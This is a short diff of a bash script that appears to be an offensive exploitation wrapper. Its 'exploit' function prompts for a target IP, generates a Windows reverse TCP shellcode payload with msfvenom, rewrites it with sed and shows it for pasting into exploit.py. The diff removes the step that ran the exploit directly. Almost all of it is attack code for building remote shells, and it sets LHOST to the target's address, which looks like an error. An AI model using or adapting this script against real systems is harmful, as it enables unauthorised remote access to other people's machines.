@@ -30,13 +30,18 @@ exploit(){
     echo -e "${W}Please enter the target IP${NC}"
     read TARGET
     echo -e "${YLW}An xterm window will pop-up and generate shellcode & then copy the\nraw shellcode & paste it into the section named ${ORNG}USER_PAYLOAD ${YLW}as is.\n(${RED}'buf' ${YLW}will be replaced with ${ORNG}'USER_PAYLOAD' ${YLW}automatically')${NC}"
-    xterm -e msfvenom -p windows/shell_reverse_tcp LHOST=${TARGET} LPORT=${PORT} -f py -b '\x00\x0a\x0d\x20'
+    sudo msfvenom -p windows/shell_reverse_tcp LHOST=${TARGET} LPORT=${PORT} -f py -b '\x00\x0a\x0d\x20' > raw_shell
+    sudo sed -i "s/${OUT}/${IN}/g" raw_shell
+    KD=$(kdialog -h)
+    if [[ ${KD} == "" ]]; then
+        COM='cat'
+    else
+        COM='kdialog --geometry 600x800 --textbox'
+    fi 
+    ${COM} raw_shell
     sleep 2
     sudo nano exploit.py
     sleep 1
-    sed -i "s/${OUT}/${IN}/g" exploit.py
-    sleep 1
-    python exploit.py -ip ${TARGET}
 }
 
 PS3='Which module would you like to use?'
